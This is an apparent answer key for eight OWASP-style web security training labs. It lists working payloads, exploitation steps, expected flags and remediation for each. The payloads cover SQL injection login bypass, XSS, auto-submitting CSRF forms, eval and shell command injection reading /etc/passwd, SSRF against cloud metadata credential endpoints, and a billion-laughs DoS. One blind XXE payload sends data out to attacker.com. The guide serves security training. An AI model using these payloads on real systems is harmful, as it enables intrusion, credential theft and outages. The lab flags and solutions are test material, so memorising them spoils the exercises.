# OWASP Labs - Complete Solutions Guide

## Lab 1: SQL Injection - Login Bypass

**Vulnerability Type:** SQL Injection (SQLi)

**Difficulty Level:** Beginner

**Points:** 100

**Description:**
This lab demonstrates basic SQL injection vulnerability in a login form. The application does not properly validate or sanitize user input before using it in SQL queries.

**Approach:**

1. Identify the login form input fields
2. Understand that the application concatenates user input directly into SQL queries
3. Use SQL syntax to bypass authentication without knowing valid credentials

**Vulnerable Code Pattern:**

```
SELECT * FROM users WHERE username = 'input' AND password = 'input'
```

**Solution Payload:**

```
Username: admin' --
Password: anything
```

**Explanation:**

- The `'` (single quote) closes the username string in the SQL query
- The `--` (double dash) comments out the rest of the query, including the password check
- This results in the query: `SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'`
- The AND password clause is ignored, allowing login as admin without a valid password

**Expected Flag:** `FLAG{sqli_basic}`

**Remediation:**

- Use parameterized queries/prepared statements
- Validate and sanitize all user inputs
- Implement proper authentication mechanisms

---

## Lab 2: Cross-Site Scripting (XSS) - Search Box Injection

**Vulnerability Type:** Stored/Reflected XSS

**Difficulty Level:** Intermediate

**Points:** 100

**Description:**
This lab demonstrates cross-site scripting vulnerabilities in search functionality. User input is reflected in the page without proper encoding.

**Approach:**

1. Locate the search input field
2. Understand that the search term is reflected in the page
3. Inject JavaScript code that will be executed in the browser

**Solution Payload:**

```
<script>alert('XSS')</script>
```

**Alternative Payloads:**

```
<img src=x onerror="alert('XSS')">
"><script>alert('XSS')</script>
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
```

**Explanation:**

- The search application reflects user input without HTML encoding
- JavaScript tags are executed by the browser
- An alert box will display, proving script execution
- In real attacks, this could be used for session hijacking, credential theft, or malware distribution

**Expected Flag:** `FLAG{xss_basic}`

**Remediation:**

- HTML encode all user input before displaying
- Use Content Security Policy (CSP) headers
- Validate and sanitize input on both client and server
- Use templating engines with auto-escaping

---

## Lab 3: Cross-Site Request Forgery (CSRF) Attack

**Vulnerability Type:** CSRF

**Difficulty Level:** Advanced

**Points:** 150

**Description:**
This lab demonstrates CSRF attacks where an attacker tricks a user into performing unwanted actions on a website where they're authenticated.

**Approach:**

1. Identify state-changing operations (transfers, settings changes, etc.)
2. Understand the application lacks CSRF protection tokens
3. Create a malicious page that forces the victim's browser to make requests

**Solution Payload:**

```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://target-app/api/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="recipient" value="attacker" />
    </form>
  </body>
</html>
```

**Alternative Approach:**
Create an image tag that triggers a GET request:

```html
<img
  src="http://target-app/api/transfer?amount=1000&recipient=attacker"
  style="display:none"
/>
```

**Explanation:**

- If a user is logged in and visits the attacker's page, the form auto-submits
- The victim's browser sends authenticated requests to the target application
- The target application accepts the request because it comes from an authenticated user
- No CSRF token validation is performed

**Expected Flag:** `FLAG{csrf_basic}`

**Remediation:**

- Implement CSRF tokens (sync-token pattern)
- Use SameSite cookie attribute
- Verify Origin and Referer headers
- Require re-authentication for sensitive operations

---

## Lab 4: Insecure Direct Object References (IDOR)

**Vulnerability Type:** IDOR

**Difficulty Level:** Intermediate

**Points:** 100

**Description:**
This lab demonstrates IDOR where users can access resources belonging to other users by directly manipulating object references in URLs or API calls.

**Approach:**

1. Authenticate as a low-privilege user
2. Access your own resource (e.g., profile, document)
3. Observe the URL pattern or API call (e.g., /api/users/1)
4. Modify the ID to access other users' resources
5. Capture sensitive information

**Solution Payload:**

```
GET /api/user/profile -> /api/user/2
GET /api/documents/1 -> /api/documents/2, /api/documents/3, ...
POST /api/user/123/settings -> /api/user/124/settings
```

**Exploitation Steps:**

1. Login as test user with ID 1
2. Visit API endpoint: `GET /api/users/2/profile`
3. Access another user's profile data
4. Try: `GET /api/users/999/profile` for admin or special users
5. Find flag in response

**Expected Flag:** `FLAG{idor_basic}`

**Remediation:**

- Verify user authorization before returning resource data
- Implement access control checks on all resource endpoints
- Use tokens or session-based authorization
- Avoid exposing sequential or predictable IDs
- Implement proper role-based access control (RBAC)

---

## Lab 5: Remote Code Execution (RCE)

**Vulnerability Type:** RCE

**Difficulty Level:** Master

**Points:** 200

**Description:**
This lab demonstrates remote code execution vulnerabilities that allow attackers to execute arbitrary commands on the server.

**Approach:**

1. Find input fields that are processed by server-side code
2. Identify the backend language/technology
3. Inject code payloads specific to that technology
4. Execute system commands to read files or gather information

**Solution Payloads (Python/Flask):**

```
__import__('os').system('cat /flag.txt')
eval('1+1')
exec('import os; os.system("cat /etc/passwd")')
```

**PHP Payload (if applicable):**

```
system('cat /flag.txt');
shell_exec('whoami');
passthru('id');
```

**Node.js Payload:**

```
require('child_process').execSync('cat /flag.txt').toString()
eval('process.exit()')
```

**General Command Payloads:**

```
; cat /flag.txt
| cat /flag.txt
&& cat /flag.txt
`cat /flag.txt`
$(cat /flag.txt)
```

**Exploitation Steps:**

1. Find a file upload or code evaluation functionality
2. Submit malicious code
3. Access the output or error messages
4. Extract the flag from command output

**Expected Flag:** `FLAG{rce_basic}`

**Remediation:**

- Never use eval() or exec() with user input
- Use built-in secure methods instead of shell execution
- Implement strict input validation and whitelisting
- Run applications with minimal privileges
- Use sandboxing and containerization

---

## Lab 6: Server-Side Request Forgery (SSRF)

**Vulnerability Type:** SSRF

**Difficulty Level:** Advanced

**Points:** 150

**Description:**
This lab demonstrates SSRF attacks where the server makes requests to internal resources or external systems based on user-controlled input.

**Approach:**

1. Find URL input fields (image download, proxy, URL fetch)
2. Test with external URLs first to confirm functionality
3. Attempt to access internal resources
4. Access metadata services or internal APIs

**Solution Payloads:**

```
http://localhost:8080/admin
http://127.0.0.1:5000/api/admin
http://192.168.1.1
http://metadata.google.internal/computeMetadata/v1/
```

**AWS Metadata Exploitation:**

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**File Protocol:**

```
file:///etc/passwd
file:///flag.txt
```

**Exploitation Steps:**

1. Find image upload or URL fetch endpoint
2. Submit: `http://localhost:5000/api/admin/flag`
3. Observe server's response
4. The server fetches internal resources and returns data
5. Extract sensitive information

**Expected Flag:** `FLAG{ssrf_basic}`

**Remediation:**

- Validate and whitelist allowed URLs
- Disable dangerous protocols (file://, gopher://)
- Use internal firewalls to restrict server communications
- Implement network segmentation
- Disable metadata service access when not needed

---

## Lab 7: XML External Entity (XXE) Injection

**Vulnerability Type:** XXE

**Difficulty Level:** Master

**Points:** 200

**Description:**
This lab demonstrates XXE vulnerabilities in XML parsing where external entities can be exploited to read files or cause DoS.

**Approach:**

1. Find XML input fields (file uploads, API requests)
2. Craft malicious XML with entity definitions
3. Reference local files through entities
4. Retrieve sensitive information through XXE

**Solution Payloads:**

**Basic XXE Payload:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**XXE File Read Payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<data>
  <input>&xxe;</input>
</data>
```

**Blind XXE (Out-of-band):**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?data=SECRETS">]>
<root>&xxe;</root>
```

**XXE Billion Laughs DoS:**

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

**Exploitation Steps:**

1. Upload or submit XML document
2. Include XXE payload as shown above
3. Observe file contents in response
4. Extract the flag

**Expected Flag:** `FLAG{xxe_basic}`

**Remediation:**

- Disable XML external entity processing
- Use XML parsing libraries with XXE disabled by default
- Implement strict schema validation (XSD)
- Run XML parsers with minimal privileges
- Implement request size limits

---

## Lab 8: Command Injection

**Vulnerability Type:** Command Injection

**Difficulty Level:** Master

**Points:** 200

**Description:**
This lab demonstrates command injection vulnerabilities where user input is passed to system commands without proper sanitization.

**Approach:**

1. Find functionality that processes user input as part of system commands
2. Identify command separators (`;`, `|`, `&`, `&&`, `||`)
3. Inject additional commands
4. Execute arbitrary system commands

**Solution Payloads:**

```
test; cat /flag.txt
test && whoami
test | cat /etc/passwd
test $(cat /flag.txt)
test `whoami`
test; id; ls -la
```

**Exploitation Examples:**

**URL-based:**

```
/ping?host=localhost; cat /flag.txt
/dns?domain=google.com || cat /flag.txt
```

**Form-based:**

```
filename: report.pdf; cat /flag.txt > report.pdf
search: test && whoami
```

**Advanced Payloads:**

```
; cat /flag.txt #
; cat /flag.txt;
' ; cat /flag.txt ; '
$(cat /flag.txt)
`whoami`
| tee /tmp/output.txt
```

**Exploitation Steps:**

1. Find a command-based feature (ping, nslookup, etc.)
2. Submit: `localhost; cat /flag.txt`
3. Observe output for flag
4. Use output redirection if needed: `command && output_saved`

**Expected Flag:** `FLAG{command_injection_basic}`

**Remediation:**

- Avoid shell execution when possible
- Use language built-in functions instead of shell commands
- Implement strict input validation and whitelisting
- Escape shell metacharacters properly
- Run processes with minimal privileges
- Use command whitelisting

---

## General Security Best Practices

1. **Input Validation:** Always validate and sanitize user input
2. **Output Encoding:** Encode output based on context (HTML, URL, JavaScript)
3. **Authentication:** Implement strong authentication mechanisms
4. **Authorization:** Verify users have permission to access resources
5. **Error Handling:** Don't expose sensitive information in error messages
6. **Logging:** Log and monitor security-relevant events
7. **Updates:** Keep frameworks, libraries, and systems updated
8. **Security Headers:** Implement CSP, X-Frame-Options, X-Content-Type-Options
9. **HTTPS:** Always use HTTPS in production
10. **Database Security:** Use parameterized queries, principle of least privilege

---

## Testing Checklist

For each lab:

- [ ] Understand the vulnerability type
- [ ] Identify the vulnerable input/functionality
- [ ] Test with the provided payload
- [ ] Verify the exploit works
- [ ] Submit the flag
- [ ] Review the remediation steps
- [ ] Practice defensive coding

---

## Resources for Further Learning

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- Burp Suite: https://portswigger.net/burp
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- HackTheBox: https://www.hackthebox.com/
- TryHackMe: https://tryhackme.com/
